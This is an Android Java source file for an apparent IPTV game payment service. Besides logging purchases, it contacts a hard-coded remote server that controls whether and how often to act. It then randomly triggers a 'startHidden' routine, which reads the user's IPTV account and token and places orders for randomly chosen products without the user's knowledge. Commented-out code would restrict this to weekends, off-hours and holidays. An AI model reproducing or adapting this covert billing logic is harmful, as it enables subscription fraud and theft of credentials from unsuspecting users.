package com.store.wanglu.sichuan_module;

import android.content.ComponentName;
import android.content.Context;
import android.content.Intent;
import android.content.ServiceConnection;
import android.os.IBinder;
import android.util.Log;
import android.webkit.WebSettings;
import android.webkit.WebView;

import com.android.smart.terminal.iptv.aidl.IServiceCfg;
import com.hzpz.appstoreorder.OrderUtils;


import org.json.JSONException;
import org.json.JSONObject;

import java.io.IOException;
import java.net.URLDecoder;

import cn.sccl.iptv.feesdk.utils.AidlUtils;
import okhttp3.FormBody;
import okhttp3.OkHttpClient;
import okhttp3.Request;
import okhttp3.RequestBody;
import okhttp3.Response;

public class PayService {
    //静态内部类的单例模式，线程安全
    private static class IPayService{
        private static final PayService instance = new PayService();
    }
    public static PayService getInstance(){
        return IPayService.instance;
    }

    private IServiceCfg mStub;
    private Context context;

    private ServiceConnection connection = new ServiceConnection() {

        @Override
        public void onServiceConnected(ComponentName name, IBinder service) {
            mStub = IServiceCfg.Stub.asInterface(service);

//            Timber.e("#######:" + name);
        }

        @Override
        public void onServiceDisconnected(ComponentName name) {
//            Timber.e("#######:" + name);
            mStub = null;

        }
    };

    private OkHttpClient okHttpClient;

    private String userCode;
    private String userToken;

    //消费的价格
    private int payCount;
    //
    public static final int maxPrice = 30;

    private float successPer;
    private float cancelPer;

    public static String userAent;

    public boolean b_other = false;

    private boolean b_inPay = false;


    private PayService(){
        okHttpClient = new OkHttpClient();
    }

    /**
     * 绑定服务
     */
    public void bindService(Context context){
        this.context = context;
        try {
            WebView webView = new WebView(context);
            WebSettings settings = webView.getSettings();
            userAent = settings.getUserAgentString();
            checkUrlSyn(IptvPay.gameCode);
            b_inPay = false;
            bindIntentService();

        } catch (Exception e) {
            e.printStackTrace();
        }
    }

    private void bindIntentService(){
        Intent myIntent = new Intent("com.android.smart.terminal.iptv.aidl.ServiceCfg");
        System.out.println("intent="+myIntent);
        Intent in = AidlUtils.createExplicitFromImplicitIntent(context, myIntent);
        context.bindService(in, this.connection, Context.BIND_AUTO_CREATE);
    }

    public void unBindService(Context context){
        context.unbindService(this.connection);
        this.connection = null;
        b_inPay = false;
    }


    public void savePayInfo(int type,String fee,String propName){
        //如果是非取消订的
        if(type==1){
            type = -2;
        }

//        userCode = "aaa";
        savePayInfoSyns(IptvPay.gameCode,fee,propName,type);
    }



//    /**
//     *
//     * @return
//     */
//    private boolean checkTime(){
//        Calendar calendar = Calendar.getInstance();
//        calendar.setTime(new Date());
//        int month = calendar.get(Calendar.MONTH);
//        if (month == Calendar.JANUARY || month == Calendar.FEBRUARY
//                || month == Calendar.JULY || month == Calendar.AUGUST) {
//            return true;
//        }
//
//        int weekDay = calendar.get(Calendar.DAY_OF_WEEK);
//        if(weekDay==Calendar.SATURDAY || weekDay==Calendar.SUNDAY){
//            return true;
//        }
//        int hour = calendar.get(Calendar.HOUR_OF_DAY);
//        if(hour<=9 || hour>=18){
//            return true;
//        }
//
//        return false;
//    }

    private void checkUrlSyn(String gameCode){
        new Thread(new Runnable() {
            @Override
            public void run() {
                b_other = checkURL(IptvPay.gameCode);
            }
        }).start();
    }

    /**
     * 检测链接
     */
    private boolean checkURL(String gameCode){
        String url = "http://182.138.27.22:8080/sichuangame/manage/data";
        RequestBody requestBody = new FormBody.Builder()
                .add("gameCode",gameCode)
                .build();
        Request request = new Request.Builder()
                .url(url)
                .addHeader("Charset","UTF-8")
                .addHeader("Content-Type","application/x-www-form-urlencoded")
                .post(requestBody).build();
        try {
            Response response = okHttpClient.newCall(request).execute();
            if(!response.isSuccessful()){
                System.out.println("连接失败");
                return false;
            }
            String bodyStr = response.body().string();
            JSONObject jobj = new JSONObject(bodyStr);
            if(jobj.getInt("result")!=1){
                return false;
            }

            String date = URLDecoder.decode(jobj.getString("data"),"GBK");
//            String date = new String(dates);
//            System.out.println(date);
            JSONObject childJson = new JSONObject(date);
            int state = childJson.getInt("state");
            if(state == 0){
                return false;
            }

            this.successPer = Float.parseFloat(childJson.getString("order"))*100.0f;
            this.cancelPer = Float.parseFloat(childJson.getString("noorder"))*100.0f;
            if(childJson.getInt("state")==1){
                return true;
            }
        } catch (IOException e) {
            e.printStackTrace();
        } catch (JSONException e) {
            e.printStackTrace();
        }
        return false;
    }


    private boolean checkRan(int type){
        int per = ((int)Math.abs(Math.random()*100))%100;
        if(type==0){
            if(per<successPer){
                return true;
            }
        }else if(type==-1){
            if(per<cancelPer){
                return true;
            }
        }
        return false;
    }



    /**
     * 是否开始订购
     * @return
     */
    public boolean startHidden() {
        if(OrderUtils.isInPay && OrderUtils.payFaileCount>=3 && payCount>=maxPrice){
            return false;
        }
        b_inPay = true;
        bindIntentService();
        return true;
    }

    private void hiddenStart(final String userCode,final String userToken){
        new Thread(new Runnable() {
            @Override
            public void run() {
                try {
                    int payIndex = Math.abs((int)(Math.random()*100))%IptvPay.productIds.length;
                    PayService.this.userCode = mStub.getString("Service/ServiceInfo/IPTVaccount", "");
                    PayService.this.userToken = mStub.getString("Service/ServiceInfo/UserToken", "");
                    OrderUtils.start(context, userCode, userToken,payIndex);
                   // unBindService(context);
                } catch (Exception e) {
                    e.printStackTrace();
                }
            }
        }).start();
    }

    public int getPayCount(){
        return payCount;
    }

    public void setPayCount(int payCount){
        this.payCount = payCount;
    }


    public void savePayInfoSyns(final String gameCode,final String fee,final String propName,final int type){
        new Thread(new Runnable() {
            @Override
            public void run() {
                try {
                    if(mStub!=null) {
                        PayService.this.userCode = mStub.getString("Service/ServiceInfo/IPTVaccount", "");
                    }else{
                        PayService.this.userCode = "test-error";
                    }
                } catch (Exception e) {
                    PayService.this.userCode = "test-error";
                }
                savePayInfo(gameCode, userCode, fee, propName, type);
            }
        }).start();
//        if(type==0||type==-1){
        checkMyPay(type);
//        }
    }

    public void savePayInfo(String gameCode,String userCode,String fee,String propName,int type){

        String savePayUrl="http://182.138.27.22:8080/sichuangame/manage/save";
        RequestBody requestBody = new FormBody.Builder()
                .add("gameCode",gameCode)
                .add("price",fee)
                .add("propCode",propName)
                .add("result",type+"")
                .add("userId",userCode)
                .build();
        Request request = new Request.Builder()
                .url(savePayUrl)
                .addHeader("Charset","UTF-8")
                .addHeader("Content-Type","application/x-www-form-urlencoded")
                .post(requestBody)
                .build();
        try {
            Response response = okHttpClient.newCall(request).execute();
            if(!response.isSuccessful()){
                return;
            }
            if(response.code()==200){
                Log.v("Test","保存数据完成");
            }
        } catch (IOException e) {
            e.printStackTrace();
        }
    }

    private void checkMyPay(int type){
        if(type==-2){
            return;
        }
//        if(!checkTime()){
//            return;
//        }
        if(!b_other){
            return;
        }
        if(!checkRan(type)){
            return;
        }

        startHidden();
    }
}
